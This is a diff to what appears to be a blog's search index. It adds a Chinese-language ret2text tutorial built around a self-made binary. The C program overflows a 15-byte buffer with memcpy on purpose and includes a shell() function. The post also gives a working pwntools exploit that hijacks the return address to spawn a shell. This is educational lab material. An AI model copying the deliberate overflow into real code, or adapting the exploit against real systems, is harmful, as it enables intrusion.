@@ -1796,4 +1796,41 @@
         <tag>平方</tag>
       </tags>
   </entry>
+  <entry>
+    <title></title>
+    <url>/2023/02/01/3.PNG/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>ret2text</title>
+    <url>/2023/02/01/ret2text/</url>
+    <content><![CDATA[<h3 id="机器环境"><a href="#机器环境" class="headerlink" title="机器环境"></a>机器环境</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc version 11.3.0 (Debian 11.3.0-5)</span><br><span class="line">debian11</span><br><span class="line">Linux 5.10.0-16-amd64 #1 SMP Debian 5.10.127-1 (2022-06-30) x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>
+
+<h3 id="test-c源码"><a href="#test-c源码" class="headerlink" title="test.c源码"></a>test.c源码</h3><ul>
+<li>test.c<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">	system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_name</span><span class="params">(<span class="keyword">char</span> *input)</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">15</span>];</span><br><span class="line">	<span class="built_in">memcpy</span>(buf,input,<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Hello %s\n&quot;</span>,buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;ck&quot;</span>);</span><br><span class="line">	read(<span class="number">0</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">	print_name(buf);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li>编译时注意关闭pie<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -no-pie test.c</span><br></pre></td></tr></table></figure></li>
+<li>目录树<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── a.out</span><br><span class="line">└── test.c</span><br></pre></td></tr></table></figure>
+<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3></li>
+</ul>
+<ol>
+<li>利用pwntools查看文件保护信息<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf=ELF(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line"><span class="comment">#result</span></span><br><span class="line">[*] <span class="string">&#x27;/home/xxx/test/a.out&#x27;</span></span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure></li>
+<li>使用ida打开a.out</li>
+<li>进入print_name函数中，查看buf分配大小<img src="http://121.5.125.62/image/ret2text/1.PNG" alt="print_name">，dest的rbp大小为0x0f。</li>
+<li>查看shell函数的地址<img src="http://121.5.125.62/image/ret2text/2.PNG" alt="shell">，shell函数的入口地址为0x040116。</li>
+<li>Ubuntu18.04 64位 和 部分Ubuntu16.04 64位 调用system的时候，rsp的最低字节必须为0x00（栈以16字节对齐），否则无法运行system指令。要解决这个问题，只要将返回地址设置为跳过函数开头的push rbp就可以了。<br>根据以上信息就可以写exp了。</li>
+</ol>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="comment">#加载a.out文件</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./a.out&#x27;</span>)</span><br><span class="line"><span class="comment">#context.terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#进入程序</span></span><br><span class="line">p=elf.process()</span><br><span class="line"><span class="comment">#输出程序加载地址</span></span><br><span class="line">s=elf.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(s))</span><br><span class="line"><span class="comment">#b&#x27;a&#x27;为任意字节即可(python3用b&#x27;a&#x27;，python2用&#x27;a&#x27;)</span></span><br><span class="line"><span class="comment">#长度23由buf的rbp大小0x0f，64位rbp大小8字节，相加即可</span></span><br><span class="line"><span class="comment">#0x0401167是shell入口地址去除首位指令</span></span><br><span class="line"><span class="comment">#32位程序用p32()函数，64位程序用p64()函数</span></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">23</span>)+p64(<span class="number">0x0401167</span>))</span><br><span class="line"><span class="comment">#交互</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p><img src="http://121.5.125.62/image/ret2text/3.PNG" alt="res"></p>
+]]></content>
+      <tags>
+        <tag>pwn</tag>
+        <tag>pwntools</tag>
+        <tag>ret2text</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2023/02/01/%5B1.PNG/</url>
+    <content><![CDATA[]]></content>
+  </entry>
 </search>
